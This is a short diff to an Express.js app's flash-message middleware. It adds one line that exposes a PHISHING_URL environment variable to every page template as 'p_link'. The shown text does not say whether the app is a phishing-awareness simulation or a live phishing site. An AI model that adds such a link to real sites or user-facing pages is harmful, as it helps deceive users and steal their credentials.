@@ -35,6 +35,7 @@ app.use(flash());
 
 // Flash middleware to make messages available to all templates
 app.use((req, res, next) => {
+    res.locals.p_link = process.env.PHISHING_URL;
     res.locals.success_msg = req.flash('success_msg');
     res.locals.error_msg = req.flash('error_msg');
     res.locals.error = req.flash('error');
